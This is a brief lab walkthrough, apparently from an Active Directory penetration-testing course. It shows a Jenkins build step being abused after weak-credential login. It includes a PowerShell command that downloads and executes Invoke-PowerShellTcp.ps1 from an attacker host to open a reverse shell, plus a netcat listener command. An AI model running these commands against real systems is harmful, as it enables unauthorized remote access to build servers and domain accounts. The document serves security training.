From Jenkins webserver we found 3 users and within them `builduser` found to be using weak password `builduser`

Since we are authenticated, we can edit Project configuration and get Reverse Shell using `Execute Windows batch command` 

```
powershell.exe iex (iwr http://172.16.100.29/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.29 -Port 443
```

Before we run `Build Now`, Start reverse shell in windows

```
.\netcat-win32-1.12\nc64.exe -lvp 443
```

Also start a simple web server using `HFS` so that it will host our file `Invoke-PowerShellTcp.ps1`

Finally when we run `Build Now` and we will get reverse shell as `dcorp\ciadmin`
